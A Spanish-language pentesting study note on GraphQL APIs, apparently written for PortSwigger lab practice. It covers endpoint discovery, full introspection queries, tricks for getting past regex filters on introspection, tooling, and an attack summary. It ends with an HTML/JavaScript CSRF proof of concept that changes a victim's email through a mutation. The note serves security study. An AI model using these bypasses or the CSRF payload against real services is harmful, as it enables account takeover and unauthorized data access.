---
aliases:
  - GraphQL
  - graphql-entrypoint
  - introspection
tags:
  - vuln/graphql
  - entrypoint
---

# GraphQL API — Punto de entrada

> Documento **agnóstico**: *cómo **explorar y explotar** una API GraphQL*. Los labs con objetivo y solución → [[vulnerabilities/021-graphql/labs/README|labs de GraphQL]].

## 🔍 Identificar un endpoint GraphQL

**Método 1 — query universal.** Toda API GraphQL responde a:
```graphql
query{__typename}
```
```json
{"data": {"__typename": "query"}}
```

**Método 2 — wordlist de paths típicos:**
```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
```

**Método 3 — cambiar el método HTTP** (ej. `GET` en vez de `POST`) si el `POST` está bloqueado o filtrado.

## 🔎 Introspection (descubrir el schema)

La **introspection** es la query que expone **todo** el schema (tipos, queries, mutations, campos, args). Es el primer paso: mapea la API.

**Probe request** (¿está habilitada?):
```json
{ "query": "{__schema{queryType{name}}}" }
```

### Bypasses si la introspection está filtrada

Muchos filtros son un **regex ingenuo** sobre `__schema{`. Trucos:

- **Newline después de `__schema`** (rompe el match del regex):
  ```json
  { "query": "query{__schema
  {queryType{name}}}" }
  ```
- **Probe como GET** (URL-encoded):
  ```
  GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
  ```

### Full introspection query
```graphql
query IntrospectionQuery {
    __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
         ...FullType
        }
        directives {
            name
            description
            args { ...InputValue }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args { ...InputValue }
        type { ...TypeRef }
        isDeprecated
        deprecationReason
    }
    inputFields { ...InputValue }
    interfaces { ...TypeRef }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
    name
    description
    type { ...TypeRef }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType { kind name }
        }
    }
}
```
> Referencia PortSwigger: *Accessing GraphQL API schemas using introspection*.

## 🧭 Queries útiles de introspection (puntuales)

**Todos los tipos:**
```graphql
{ __schema { types { name } } }
```
**Queries disponibles:**
```graphql
{ __type(name: "query") { fields { name } } }
```
**Todas las mutations:**
```graphql
{ __type(name: "mutation") { fields { name } } }
```
**Campos de un tipo (ej. `User`):**
```graphql
{ __type(name: "User") { fields { name } } }
```
**Tipos y kind de cada campo:**
```graphql
{ __type(name: "User") { fields { name type { name kind } } } }
```
**Parámetros (args) de una query:**
```graphql
{ __type(name: "query") { fields { name args { name type { name kind } } } } }
```

## 🧰 Utilidades

- **GraphQL Visualizer** — dibuja el schema como grafo → https://nathanrandal.com/graphql-visualizer/
- **Apollo GraphQL / Sandbox** — útil para explorar; ayuda **si la introspection está desactivada**.
- **Clairvoyance** — infiere el schema (sugerencias de campos) **cuando la introspection está bloqueada**.
- **InQL** (extensión de Burp) — introspection + navegación del schema dentro de Burp.

## 💥 Ataques (resumen)

Detalle y solución paso a paso → [[vulnerabilities/021-graphql/labs/README|labs de GraphQL]].

- **Autz rota por campo/objeto (+ IDOR):** pedir campos/objetos ocultos (`postPassword`, `password`, cambiar `id`).
- **Endpoint oculto + bypass de introspection** (arriba).
- **Alias / batching:** N operaciones en un request → **bypass de brute force / rate-limit**.
- **CSRF over GraphQL:** endpoint sin CSRF token que acepta `x-www-form-urlencoded` → un form cross-site dispara una **mutation**.

### PoC — CSRF over GraphQL (cambiar email de la víctima)
```html
<script>
document.addEventListener("DOMContentLoaded", () => {
const randomEmail = Math.random().toString(36).slice(2) + "@example.com";
const url = "https://LAB-ID.web-security-academy.net"

const form = document.createElement("form");
form.method = "POST";
form.action = `${url}/graphql/v1`;

const input = document.createElement("input");
input.type = "text";
input.name = "query";
input.value = `\n    mutation {\n        changeEmail(input: {email:\"${randomEmail}\"}) {\n            email\n        }\n    }\n` ;
form.appendChild(input);

document.body.appendChild(form);
form.submit();
});
</script>
```

> [!note] Ver también
> - **Labs** (5, con objetivo y solución) → [[vulnerabilities/021-graphql/labs/README|labs de GraphQL]].
> - **Scripts:** `execute-graphql.py` (correr una mutation) · `brute-force-graphql.py` (alias brute force) → `vulnerabilities/021-graphql/scripts/`.
> - **CSRF** (el PoC de arriba es CSRF sobre una mutation) → [[vulnerabilities/003-csrf/csrf|csrf]].
